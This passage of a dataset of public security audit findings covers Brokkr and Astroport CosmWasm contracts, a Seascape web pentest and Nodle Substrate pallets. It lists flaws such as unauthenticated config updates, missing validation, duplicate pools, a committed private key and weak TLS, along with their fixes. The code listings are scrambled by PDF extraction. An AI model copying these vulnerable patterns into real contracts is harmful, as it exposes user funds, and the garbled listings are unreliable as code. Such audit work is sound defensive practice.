msg . ust_bonding_discount , lp_bonding_discount : msg . lp_bonding_discount , min_bro_payout : msg . min_bro_payout , vesting_period_blocks : msg . vesting_period_blocks , lp_bonding_enabled : msg . lp_bonding_enabled , 59  treasury_contract )? , 60  astroport_factory )? , 61  oracle_contract )?, 62 63 64 65 66 67 68 69 ) ?; }, update_config function does not validate that ust_bonding_reward_ratio, ust_bonding_discount or lp_bonding_discount are less or equal than 1: Listing 17: contracts/bonding-v1/src/commands.rs (Lines 347,351,355) config . ust_bonding_reward_ratio = ust_bonding_reward_ratio ; 346 if let Some ( ust_bonding_reward_ratio ) = ust_bonding_reward_ratio { 347 348 } 349 350 if let Some ( ust_bonding_discount ) = ust_bonding_discount { 351 352 } 353 354 if let Some ( lp_bonding_discount ) = lp_bonding_discount { 355 356 } config . ust_bonding_discount = ust_bonding_discount ; config . lp_bonding_discount = lp_bonding_discount ; Risk Level: Likelihood - 2 Impact - 3 31 Recommendation: Add a validation routine inside instantiate and update_config functions to ensure that values of ust_bonding_reward_ratio, ust_bonding_discount and lp_bonding_discount are less or equal than 1. Remediation plan: SOLVED: The issue was fixed in commit e80b7dc97ff20b683cd27d7a4cdaa6d7d60c1076. 32 ", "labels": ["Halborn", "Brokkr_Protocol_P1_Contracts_CosmWasm", "Severity: Low"]}, {"title": "MISSING VALIDATION FOR MIN AND MAX VALUES OF LOCKUP PERIOD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P1_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "instantiate and update_config functions in staking-v1 contract do not validate that min_lockup_period_epochs is less than max_lockup_peri od_epochs. The aforementioned values are used to validate the lockup period when staking locked BRO tokens or locking a previous staked amount. If those values are not correctly set, operations will throw error messages and wont allow legitimate users to stake or lock BRO tokens, thus generating a denial of service (DoS) in Brokkr protocol. Code Location: instantiate function does not validate that min_lockup_period_epochs is less than max_lockup_period_epochs: Listing 18: contracts/staking-v1/src/contract.rs (Lines 57-58) deps . storage , & Config { 45 store_config ( 46 47 48 49 50 51  rewards_pool_contract )? , 52  bbro_minter_contract )? , 53  epoch_manager_contract )? , 54 55 56 owner : deps . api . addr_canonicalize (& msg . owner )? , paused : false , bro_token : deps . api . addr_canonicalize (& msg . bro_token )? , rewards_pool_contract : deps . api . addr_canonicalize (& msg . bbro_minter_contract : deps . api . addr_canonicalize (& msg . epoch_manager_contract : deps . api . addr_canonicalize (& msg . unstake_period_blocks : msg . unstake_period_blocks , min_staking_amount : msg . min_staking_amount , lockup_config : LockupConfig { 33 min_lockup_period_epochs : msg . min_lockup_period_epochs , max_lockup_period_epochs : msg . max_lockup_period_epochs , base_rate : msg . base_rate , linear_growth : msg . linear_growth , exponential_growth : msg . exponential_growth , 57 58 59 60 61 62 63 64 ) ?; }, }, update_config function does not validate that min_lockup_period_epochs is less than max_lockup_period_epochs: Listing 19: contracts/staking-v1/src/commands.rs (Lines 519,523) 518 if let Some ( min_lockup_period_epochs ) = min_lockup_period_epochs { 519 config . lockup_config . min_lockup_period_epochs =  min_lockup_period_epochs ; 520 } 521 522 if let Some ( max_lockup_period_epochs ) = max_lockup_period_epochs { 523 config . lockup_config . max_lockup_period_epochs =  max_lockup_period_epochs ; 524 } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Add a validation routine inside instantiate and update_config functions to ensure that min_lockup_period_epochs is less than max_lockup_peri od_epochs. Remediation plan: SOLVED: The issue was fixed in commit b9c1e4ad60fa79e030737e5374a8b027c147d091. 34 ", "labels": ["Halborn", "Brokkr_Protocol_P1_Contracts_CosmWasm", "Severity: Low"]}, {"title": "VESTING SCHEDULES COULD BE UNCLAIMABLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P1_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When registering new vesting accounts, the vesting contract sets the last claimed time to the configured genesis time. That parameter could be greater than the expiration date of some vesting schedules, such that vesting_info.last_claim_time > vesting_info.end_time, which makes it unclaimable. However, it is possible for the administrator to update genesis time and set new vesting schedules. Code Location: Listing 20: packages/services/src/vesting.rs, (Line 101) 101 if current_time > schedule . end_time && self . last_claim_time <  schedule . end_time { 102 103 } claimable_amount += schedule . bro_amount ; Risk Level: Likelihood - 1 Impact - 2 Recommendation: When registering vesting schedules, it is recommended to verify that the end time of that schedule is greater than the genesis time. Remediation plan: ACKNOWLEDGED: The Brokkr team acknowledged this finding. 35 3.10 (HAL-10) SLIGHT ROUNDING ISSUES WHEN PROVIDING LP TOKENS - INFORMATIONAL ", "labels": ["Halborn", "Brokkr_Protocol_P1_Contracts_CosmWasm", "Severity: Informational"]}, {"title": "HARDCODED PRIVATE KEY IN THE REPOSITORY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_NFT_Marketplace_WebApp_Pentest_Report_Halborn_Final.pdf", "body": "Testing revealed that the backend private repository on GitHub contained a private key. While the repository was private and therefore only accessible by Seascapes team, this is considered bad practice as secrets should be securely stored and shared between the development team on a need to know basis. Additionally, these might be later re-used by Seascape and should they fall in the wrong hands, they could be used to access sensitive services and data. Location: The private key could be found by browsing to the seascape-antibot- d98baf808e54.json file within the backend source code. Risk Level: Likelihood - 1 Impact - 5 Recommendation: Halborn recommends that the private key is replaced and that it is removed from the repository. Instead, environment variables should be used to Additionally, pass on arguments to the code, should it be needed. Seascape should research secret sharing solutions that could be used to share secrets used in development environments between engineers and developers. Finally, GitHub commits should be reviewed by a second person before being pushed to ensure that unintended data is not committed to the repository. 12 Remediation Plan: SOLVED: This issue was solved by using environment variables. 13 ", "labels": ["Halborn", "Seascape_NFT_Marketplace_WebApp_Pentest", "Severity: Medium"]}, {"title": "USE OF PACKAGES WITH KNOWN VULNERABILITIES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_NFT_Marketplace_WebApp_Pentest_Report_Halborn_Final.pdf", "body": "The application uses third-party dependencies to delegate handling of different kind of operations, e.g., generation of document in a specific format, HTTP communications, data parsing of a specific format, etc. However, the dependencies bring forth an expected downside where the security posture of the real application is now resting on them. Several imported packages were found to not be updated to the latest version and presented various security risks, as described below. Vulnerabilities List: FRONTEND Title Prototype Pollution Cross-Site Scripting (XSS) Open Redirect Unexpected Server Crash Exposure of Sensitive Information Exposure of Sensitive Information Denial of Service (DoS) Package immer next-js next-js next-js node-fetch simple-get trim-newlines Severity CRITICAL HIGH HIGH HIGH HIGH HIGH HIGH API Title Exposure of Sensitive Information Exposure of Sensitive Information Package simple-get node-fetch Severity HIGH HIGH Risk Level: Likelihood - 1 14 Impact - 5 Recommendation: It is highly recommended performing automated analysis of the dependencies from the birth of the project and if they happen to contain any security issues. The Seascape team needs to be aware of it and apply the required mitigation measures to secure the affected application. Remediation Plan: SOLVED: Seascape updated the highlighted packages on the frontend and the API. 15 ", "labels": ["Halborn", "Seascape_NFT_Marketplace_WebApp_Pentest", "Severity: Medium"]}, {"title": "MISSING HTTP SECURITY HEADERS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_NFT_Marketplace_WebApp_Pentest_Report_Halborn_Final.pdf", "body": "The assessment revealed that several security headers were not enforced by the application. These headers are used by client browsers to ensure various security controls are appropriately implemented during the normal functioning of the application.  X-Content-Type-Options, which indicates that the MIME types adver- tised in the Content-Type headers should not be changed and be followed.  X-Frame-Options, which indicates whether a browser should be allowed to render a page in a <frame>, <iframe>, <embed> or <object>.  Content-Security-Policy, which allows website administrators to con- trol resources the user agent is allowed to load for a given page.  Strict-Transport-Security (HSTS) - which enforces secure transmis- sion by letting a website tell browsers that it should only be accessed using HTTPS, instead of using HTTP.  Referrer-Policy - specifies what information, or parts of it, should be sent in the Referer header with the request that prompted the redirection.  Pragma - using the no-cache directive forces the browser to query the server before downloading a cached copy of the page, resulting in the download of the most recent version.  Expires - includes a date, period, or value indicating when the servers response is no longer correct. It should be noted that in some situations Strict-Transport-Security and X-Content-Type-Options (and in some cases X-Frame-Options) do not neces- sarily have to be enabled by the application directly. These headers can be injected by supporting load balancers or web application accelerators. 16 Recommendation: Seascape should review the above security headers and ensure that, where appropriate, these headers are included within all exposed endpoints and services. This allows Seascape to ensure the defence-in-depth approach is achieved thought the application. References: Strict-Transport-Security X-Content-Type-Options X-Frame-Options Content-Type Remediation Plan: SOLVED: Security related headers were added to the platform. 17 ", "labels": ["Halborn", "Seascape_NFT_Marketplace_WebApp_Pentest", "Severity: Low"]}, {"title": "TLS MISCONFIGURATIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_NFT_Marketplace_WebApp_Pentest_Report_Halborn_Final.pdf", "body": "Several misconfigurations were identified within the applications SS- L/TLS configuration that could compromise the security of communications. While attacks that target weak cipher suites or algorithms are complex to execute, with the steady progress of computational power these at- tacks become easier to achieve over time. As such, it is recommended to configure the connection to comply with security best practices. Many protocols may be used in establishing a secure connection. In the past, various vulnerabilities have existed surrounding legacy proto- cols and their associated cipher suites. Newer versions of these secure communication protocols and modern browsers address the security vulner- abilities identified in older versions. For example, the POODLE (Padding Oracle On Downgraded Legacy Encryption) vulnerability allowed information to be extracted from communication headers and the DROWN attack allowed SSLv2 traffic to be decrypted. Neither of these attacks continue to pose a threat in modern browsers. However, if a user accesses the application with an outdated browser, these vulnerabilities may remain exploitable. Encryption ciphers are used to protect communication channels between a client and a web server and are negotiated when a client initially connects to the server. This negotiation involves agreeing on a cipher suite and a combination of protocols, encryption algorithms, key lengths, and hashing algorithms supported by both parties. To support a wide range of browsers, web servers typically support ciphers of various strengths. However, some encryption algorithms do not provide adequate security, due to issues such as implementation flaws or inadequate key lengths. Additionally, permitting insecure cipher suites puts users with outdated software at greater risk, as an attacker could downgrade a users connection to an insecure cipher. The SSL cipher suites support a variety of key lengths. Only suites with sufficiently long keys should be permitted, as short keys may allow an 18 attacker to perform a brute-force attack to decrypt the traffic. Analysis: The application allowed connections with TLS v1.0 and TLS v1.1 to be established, as well as allowing the use of weak CBC cipher suites. Listing 1 not offered ( OK ) SSLv2 not offered ( OK ) SSLv3 offered ( deprecated ) TLS 1 offered ( deprecated ) TLS 1.1 offered ( OK ) TLS 1.2 offered ( OK ): final TLS 1.3 NPN / SPDY not offered ALPN / HTTP2 h2 , http /1.1 ( offered ) 1 2 3 4 5 6 7 8 9 10 Ciphers : 11 ECDHE - RSA - AES128 - SHA AES128 - SHA ECDHE - RSA - AES256 - SHA AES256 - SHA DES - CBC3 - SHA Recommendation: As the application functionality is hosted across multiple servers, the SSL/TLS configuration of each should be reviewed and updated to comply with security best practice and to minimize the risk of existing and future SSL vulnerabilities.  It is recommended to disable TLSv1.0 and TLSv1.1. It should be noted that all major browser vendors coordinated to remove support for both TLSv1.0 and TLSv1.1 in March 2020, however these depreciated versions will still be available to outdated browser versions.  Support for the weak cipher suites identified above should be re- moved.  Key lengths of 256 bits and above should be used for symmetric encryption algorithms and a length of 4096 bits should be used for 19 RSA algorithms. For asymmetric keys generated with ECC algorithms, the minimum recommended key size is 512 bits. Finally, it is recommended that forward secrecy is enabled on all hosts and that session renegotiation is not supported. If a compromise of the servers private key, forward secrecy will prevent an attacker from using it to decrypt previously recorded traffic. Remediation Plan: SOLVED: The team at Seascape amended the TLS configuration of the servers to only accept connections with version 2 and version 3. 20 THANK YOU FOR CHOOSING", "labels": ["Halborn", "Seascape_NFT_Marketplace_WebApp_Pentest", "Severity: Low"]}, {"title": "HAL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Nodle_Nodl_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that it is possible to:  Vote with 0 amount  Challenge yourself  Counter yourself  Vote for yourself By combining these properties, some scenarios might be possible:  A whale can influence any challenge/counter decision by voting for itself.  A whale can also farm additional tokens upon success by countering any application and then voting to itself.  By countering your application and voting with 0 amount, it is possible to fill up the storage since the values are pushed into vector  To remove yourself from members in the root of trust. Risk Level: Likelihood - 3 Impact - 4 Recommendation: Consider improving the design by not letting the same account to:  Vote to itself  Counter itself 14  Challenge itself  Vote with 0 deposit Remediation Plan: NOT APPLICABLE: The issue is marked as not applicable by the Nodle team as the tcr and root of trust pallets will be removed. 15 ", "labels": ["Halborn", "Nodle_Nodl_Substrate_Pallet", "Severity: Medium"]}, {"title": "HAL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Nodle_Nodl_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that if a nominator has a single validator, it is not possible to remove a validator through nominator_denominate since it has a check for <StakingMinNominatorTotalBond<T>> In that case, nominator_denominate_all has to be used, which bypasses that check, which is not intentional. Code Location: Listing 1: pallets/staking/src/lib.rs ensure! ( remaining >= < StakingMinNominatorTotalBond <T < Error <T > >:: NominatorBondBelowMin ); 1 if !do_force { 2 3  > >:: get () , 4 5 6 } Risk Level: Likelihood - 4 Impact - 2 Recommendation: Consider having a conditional statement in nominator_denominate that allows to force remove of validator if nominator has only one validator. 16 Remediation Plan: SOLVED: The issue was solved by the Nodle team.  Fix Commit 17 ", "labels": ["Halborn", "Nodle_Nodl_Substrate_Pallet", "Severity: Medium"]}, {"title": "HAL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Nodle_Nodl_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that the emergency shutdown pallet is used only in the However, there are more allocate function in the allocations pallet. public functions across different pallets that might be problematic if, at any point in time, there is a bug (security/non-security) discovered within them. There should be a functionality to shutdown them down before new fixes are pushed Code Location: These functions should have a shutdown functionality: Grants pallet  add_vesting_schedule Staking pallet  validator_join_pool  validator_exit_pool  validator_bond_more  validator_bond_less  nominator_nominate  nominator_denominate  nominator_bond_more  nominator_bond_less  nominator_move_nomination  unbond_frozen  withdraw_unbonded  withdraw_staking_rewards 18 Risk Level: Likelihood - 3 Impact - 4 Recommendation: Consider enabling shutdown functionality in critical public functions. Example Code: Listing 2 1 ensure! ( 2 3 4 !pallet_emergency_shutdown :: Pallet :: <T >:: shutdown () , Error :: <T >:: UnderShutdown ); Remediation Plan: PENDING: In a future release, the Nodle team will modify the emergency shutdown pallet to better generalize. 19 ", "labels": ["Halborn", "Nodle_Nodl_Substrate_Pallet", "Severity: Medium"]}, {"title": "HAL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Nodle_Nodl_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that the set_staking_limits privileged function is missing sanity checks on provided values. Even though it is a protected function, it is still advised to have some sanity checks to avoid any human error. Code Location: Listing 3: pallets/staking/src/lib.rs 201 pub fn set_staking_limits ( 202 203 204 205 206 207 208 origin : OriginFor <T >, max_stake_validators : u32 , min_stake_session_selection : BalanceOf <T >, min_validator_bond : BalanceOf <T >, min_nominator_total_bond : BalanceOf <T >, min_nominator_chill_threshold : BalanceOf <T >, ) -> DispatchResultWithPostInfo { Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to add sanity checks to ensure:  max_stake_validators != 0  min_stake_session_selection != 0  min_validator_bond != 0  min_nominator_total_bond != 0 20 Remediation Plan: SOLVED: The issue was solved by the Nodle team.  Fix Commit 21 ", "labels": ["Halborn", "Nodle_Nodl_Substrate_Pallet", "Severity: Low"]}, {"title": "HAL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Nodle_Nodl_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that you can create a vesting schedule to yourself. Code Location: Listing 4: pallets/grants/src/lib.rs 157 158 159 160 161 162 163 164 pub fn add_vesting_schedule ( origin : OriginFor <T >, dest : <T :: Lookup as StaticLookup >:: Source , schedule : VestingScheduleOf <T >, ) -> DispatchResultWithPostInfo { let from = ensure_signed ( origin ) ?; let to = T :: Lookup :: lookup ( dest ) ?; Self :: do_add_vesting_schedule (& from , & to , schedule .  clone () ) ?; 165 166 Self :: deposit_event ( Event :: VestingScheduleAdded ( from ,  to , schedule )); 167 168 } Ok (() . into () ) Risk Level: Likelihood - 3 Impact - 2 Recommendation: add Please fn add_vesting_schedule. check a that ensures that the from != to in the 22 Remediation Plan: SOLVED: The issue was solved by the Nodle team.  Fix Commit 23 ", "labels": ["Halborn", "Nodle_Nodl_Substrate_Pallet", "Severity: Low"]}, {"title": "HAL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Nodle_Nodl_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that the allocate function that should have a zero value check on the amount argument. Code Location: Listing 5: pallets/grants/src/lib.rs (Line 88) 85 86 87 88 89 90 91 92 pub fn allocate ( origin : OriginFor <T >, to : T :: AccountId , amount : BalanceOf <T >, proof : Vec < u8 >, ) -> DispatchResultWithPostInfo { Self :: ensure_oracle ( origin ) ?; ... Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider adding zero value checks to those functions to avoid performing redundant operations if a zero value is received. Remediation Plan: SOLVED: The issue was solved by the Nodle team. 24  Fix Commit 25 ", "labels": ["Halborn", "Nodle_Nodl_Substrate_Pallet", "Severity: Low"]}, {"title": "HAL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Nodle_Nodl_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that the pallet allows the creation of vesting schedules that are less than the current block number. Those vesting schedules are not more than the regular transfers with extra steps. Therefore, those are redundant Example: Listing 6 1 Current Block : 100 2 3 Vesting Schedule Start : 1 st Block 4 5 Period : 10 Blocks 6 7 Period_count : 2 8 9 Per Period : 1 knodl 10 11 ================== 12 13 Vesting Duration : 10 * 2 + 1 = 21 Blocks 14 Initial Transfer sent : 2 knodl 15 16 Next Claims : 0 since Vesting Duration < Current Block Risk Level: Likelihood - 1 Impact - 1 26 Recommendation: Consider adding a check that ensures that the: (period * period_count)+ start > current_block_number Remediation Plan: NOT APPLICABLE: The issue was marked as not applicable by the Nodle team saying: This can be useful to keep it as it is. In fact, we may have to create retroactive awards that may have been partially vested. 27 ", "labels": ["Halborn", "Nodle_Nodl_Substrate_Pallet", "Severity: Informational"]}, {"title": "HAL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Nodle_Nodl_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that the grants pallet contains a redundant check. Code Location: There is no need for a second new_lock.is_zero() since it was already checked prior. Removing of the vestingSchedule can be performed within the first check. Listing 7: pallets/grants/src/lib.rs (Line 253) 247 if new_lock . is_zero () { 248 T :: Currency :: remove_lock ( VESTING_LOCK_ID , & target )  ; 249 250 } else { T :: Currency :: set_lock ( VESTING_LOCK_ID , & target ,  new_lock , WithdrawReasons :: all () ); 251 252 253 254 255 256 257 } if new_lock . is_zero () { // No more claimable , clear VestingSchedules :: <T >:: remove ( target . clone () ); } else { T :: Currency :: set_lock ( VESTING_LOCK_ID , & target ,  new_lock , WithdrawReasons :: all () ); 258 } Risk Level: Likelihood - 1 Impact - 1 28 Recommendation: Please remove the second new_lock.is_zero() check and remove the vestingSchedule within the first check. Listing 8: pallets/grants/src/lib.rs 247 if new_lock . is_zero () { 248 T :: Currency :: remove_lock ( VESTING_LOCK_ID , & target )  ; 249 250 251 VestingSchedules :: <T >:: remove ( target . clone () ); } else { T :: Currency :: set_lock ( VESTING_LOCK_ID , & target ,  new_lock , WithdrawReasons :: all () ); 252 } Remediation Plan: SOLVED: The issue was solved by the Nodle team.  Fix Commit 29 ", "labels": ["Halborn", "Nodle_Nodl_Substrate_Pallet", "Severity: Informational"]}, {"title": "HAL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Nodle_Nodl_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that the old1 variable in on_finalize function in tcr pallet is redundant. Tuple returned from commit_applications is Ok(( new_members, Vec::new())). Therefore, old1 is always going to be an empty vector. Hence, extending it with old2 does not make any difference. In this scenario, we only care about new_1 Code Location: Listing 9: pallets/tcr/src/lib.rs 138 fn on_finalize ( block : T :: BlockNumber ) { 139 140 let ( mut new_1 , mut old_1 ) = Self :: commit_applications ( block ). unwrap_or (( Vec ::  new () , Vec :: new () )); 141 142 let ( new_2 , old_2 ) = Self :: resolve_challenges ( block ). unwrap_or (( Vec ::  new () , Vec :: new () )); 143 144  uniq checks // Should never be the same , so should not need some 145 146 147 148 149 150 151 152 new_1 . extend ( new_2 ); old_1 . extend ( old_2 ); new_1 . sort () ; old_1 . sort () ; Self :: notify_members_change ( new_1 , old_1 ); } 30 Listing 10: pallets/tcr/src/lib.rs (Line 478) 460 fn commit_applications ( block : T :: BlockNumber ) ->  FinalizeHelperResultFrom <T > { 461 462 463 464 let new_members = < Applications <T , I > >:: iter () . filter (|( _account_id , application )| { block . checked_sub (& application . clone () .  created_block ) 465 . expect ( \" created_block should always be  smaller than block ; qed \") 466 467 468 469 470 >= T :: FinalizeApplicationPeriod :: get () }) . map (|( account_id , application )| { < Applications <T , I > >:: remove ( account_id . clone () ); < Members <T , I > >:: insert ( account_id . clone () ,  application . clone () ); 471 Self :: unreserve_for ( account_id . clone () ,  application . candidate_deposit ); 472 Self :: deposit_event ( Event :: ApplicationPassed (  account_id . clone () )) ; 473 474 475 476 477 478 479 } account_id }) . collect :: < Vec <T :: AccountId > >() ; Ok (( new_members , Vec :: new () )) // === HERE === Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider omitting old1 and remove all actions performed on it. 31 Listing 11: pallets/tcr/src/lib.rs 247 fn on_finalize ( block : T :: BlockNumber ) { 248 249 let ( mut new_1 , _ ) = Self :: commit_applications ( block ). unwrap_or (( Vec ::  new () , Vec :: new () )); 250 251 let ( new_2 , mut old ) = Self :: resolve_challenges ( block ). unwrap_or (( Vec ::  new () , Vec :: new () )); 252 253  uniq checks // Should never be the same , so should not need some 254 255 256 257 258 259 260 261 new_1 . extend ( new_2 ); new_1 . sort () ; old . sort () ; Self :: notify_members_change ( new_1 , old ); } Remediation Plan: SOLVED: The issue was solved by the Nodle team.  Fix Commit 32 3.10 (HAL-10) HAL-10 USAGE OF VULNERABLE CRATES - INFORMATIONAL ", "labels": ["Halborn", "Nodle_Nodl_Substrate_Pallet", "Severity: Informational"]}, {"title": "ANONYMOUS CONTRACT CONFIG MODIFICATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The astroport-maker and astroport-generator contracts hold their configu- rations in storage. Configuration parameters are set with the set_config , set_allowed_reward_proxies and set_tokens_per_block functions defined in contracts/tokenomics/maker/src/contract.rs and contracts/tokenomics/ generator/src/contract.rs. Because those functions do not verify the message sender, malicious users can overwrite configuration parameters. For example, overwriting the staking and governance contract addresses may redirect new funds to attacker-controlled account(s). Code Location: Contract initialisation Listing 1: tokenomics/maker/src/contract.rs (Lines 30,39) 20 #[ cfg_attr ( not ( feature = \" library \") , entry_point ) ] 21 pub fn instantiate ( 22 23 24 25 26 ) -> Result < Response , ContractError > { 27 deps : DepsMut , _env : Env , info : MessageInfo , msg : InstantiateMsg , set_contract_version ( deps . storage , CONTRACT_NAME , CONTRACT_VERSION ) ?; let governance_contract = if let Some ( governance_contract ) = msg . governance_contract { Option :: from ( deps . api . addr_validate (& governance_contract ) ?) } else { None }; 28 29 30 31 32 33 34 18 35 36 37 38 39 40 41 42 let governance_percent = if let Some ( governance_percent ) = msg . governance_percent { if governance_percent > Uint64 :: new (100) { return Err ( ContractError :: IncorrectGovernancePercent {}) ; }; governance_percent } else { Uint64 :: zero () }; Token distribution Listing 2: tokenomics/maker/src/contract.rs (Lines 155,167) 147 let governance_amount = if let Some ( governance_contract ) = cfg . 148 149 150 151 152 153 154 155 governance_contract . clone () { let amount = amount . multiply_ratio ( Uint128 :: from ( cfg . governance_percent ) , Uint128 :: new (100) ); let to_governance_asset = Asset { info : info . clone () , amount , }; result . push ( SubMsg :: new ( to_governance_asset . into_msg (& deps . querier , governance_contract )? , )); amount Uint128 :: zero () 156 157 158 } else { 159 160 }; 161 let staking_amount = amount - governance_amount ; 162 let to_staking_asset = Asset { 163 164 165 }; 166 result . push ( SubMsg :: new ( 167 info , amount : staking_amount , to_staking_asset . into_msg (& deps . querier , cfg . staking_contract . clone () )?, 168 )); 19 Anonymous config update Listing 3: tokenomics/maker/src/contract.rs (Lines 70) staking_contract , governance_contract , governance_percent , 66 ExecuteMsg :: SetConfig { 67 68 69 70 } => set_config ( deps , 71 env , 72 staking_contract , 73 governance_contract , 74 75 governance_percent , 76 ) , Listing 4: tokenomics/maker/src/contract.rs (Lines 237,244) deps : DepsMut , _env : Env , staking_contract : Option < String >, governance_contract : Option < String >, governance_percent : Option < Uint64 >, 225 fn set_config ( 226 227 228 229 230 231 ) -> Result < Response , ContractError > { 232 233 234 235 236 237 let mut config = CONFIG . load ( deps . storage ) ?; let mut event = Event :: new ( \" Set config \" . to_string () ); if let Some ( staking_contract ) = staking_contract { config . staking_contract = deps . api . addr_validate (& 238 239 240 241 242 243 244 245 246 247 staking_contract ) ?; event . attributes . push ( Attribute :: new (\" staking_contract \" , & staking_contract )) ; }; if let Some ( governance_contract ) = governance_contract { config . governance_contract = Option :: from ( deps . api . addr_validate (& governance_contract ) ?) ; event . attributes . push ( Attribute :: new (\" governance_contract \" , & 20 248 }; governance_contract )) ; Risk Level: Likelihood - 5 Impact - 4 Recommendations: Validate the message sender in all three functions function to prevent malicious users from overwriting contract configuration parameters. Remediation plan: SOLVED: The issue was fixed in commits 35c6c37a73459166935134e47a6ceb8a1aeff5a1 and 8eede4931d71f7c48c5b469128683b6bd38810f0 -- all three functions validate the sender address now. 21 ", "labels": ["Halborn", "Astroport_fi_AMM_Protocol_CosmWasm", "Severity: High"]}, {"title": "POSSIBILITY TO CREATE POOLS WITH THE SAME PAIR", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "execute_create_pair function in contracts/factory/src/contract.rs allows the possibility to create pools with the same pair, which generates unexpected situations, e.g.: a user could withdraw more tokens than his fair share and affect other users in the pool. This issue happens because the aforementioned function does not validate if pairs in asset_infos have the same value. A proof of concept video showing how to exploit this security issue is included in the report. Additionally, it was found that when exploiting this vulnerability with the ASTRO token contract, a threat actor could farm additional gover- nance tokens potentially undermining many of the key governance concepts outlined within the Astroport lite paper. Code Location: Listing 5: contracts/factory/src/contract.rs 187 pub fn execute_create_pair ( deps : DepsMut , 188 env : Env , 189 pair_type : PairType , 190 asset_infos : [ AssetInfo ; 2] , 191 192 init_hook : Option < InitHook >, 193 ) -> Result < Response , ContractError > { 194 195 196 197 198 199 200 if PAIRS { let config = CONFIG . load ( deps . storage ) ?; . may_load ( deps . storage , & pair_key (& asset_infos )) . unwrap_or ( None ) . is_some () 22 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 return Err ( StdError :: generic_err (\" Pair already exists \" ). into () ); } // Get pair type from config let pair_config = PAIR_CONFIGS . load ( deps . storage , pair_type . to_string () ) . map_err (| _| ContractError :: PairConfigNotFound {}) ?; PAIRS . save ( deps . storage , & pair_key (& asset_infos ) , & PairInfo { liquidity_token : Addr :: unchecked ( \" \") , contract_addr : Addr :: unchecked ( \"\" ) , asset_infos : [ asset_infos [0]. clone () , asset_infos [1]. clone () ], pair_type : pair_type . clone () , }, ) ?; Risk Level: Likelihood - 4 Impact - 4 Recommendations: Update the logic of execute_create_pair function to ensure that pairs in asset_infos do not have the same value. Remediation plan: SOLVED: The issue was fixed in commit 3e9836de40a05b7b2c94c87f5cd690c1f16a7876. 23 ", "labels": ["Halborn", "Astroport_fi_AMM_Protocol_CosmWasm", "Severity: High"]}, {"title": "REPEATED POOLS CAN BE CREATED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "execute_create_pair function in contracts/factory/src/contract.rs allows the possibility to create pools with already existing pairs. This issue happens because pair_key function will consider that two addresses are different if they differ just in their upper / lower cases. The situation described above can produce the following consequences:  Potential fixes for HAL-02 can be bypassed and users will be able to create pools with the same pair, which generates unexpected situations, e.g.: a user could withdraw more tokens than his fair share and affect other users in the pool.  Repeated pools with already existing pairs can severely reduce the liquidity of each pool and, as a consequence, discourage users to add liquidity or swap using Astroport AMM protocol. A proof of concept video showing how to exploit this security issue is included in the report. Code Location: Listing 6: contracts/factory/src/contract.rs (Lines 196,197) 187 pub fn execute_create_pair ( deps : DepsMut , 188 env : Env , 189 pair_type : PairType , 190 asset_infos : [ AssetInfo ; 2] , 191 192 init_hook : Option < InitHook >, 193 ) -> Result < Response , ContractError > { 194 195 196 if PAIRS let config = CONFIG . load ( deps . storage ) ?; 24 197 198 199 200 201 202 { } . may_load ( deps . storage , & pair_key (& asset_infos )) . unwrap_or ( None ) . is_some () return Err ( StdError :: generic_err (\" Pair already exists \" ). into () ); Risk Level: Likelihood - 5 Impact - 3 Recommendations: Update the logic of execute_create_pair to turn addresses in asset_infos into lowercase before calling pair_key function. Remediation plan: SOLVED: The issue was fixed in commits 451dd974e494eefe88301f51732d7cdf09aac3d0 and 55847db04e84bddcf2a4d5607b9f26644c110a3c. 25 ", "labels": ["Halborn", 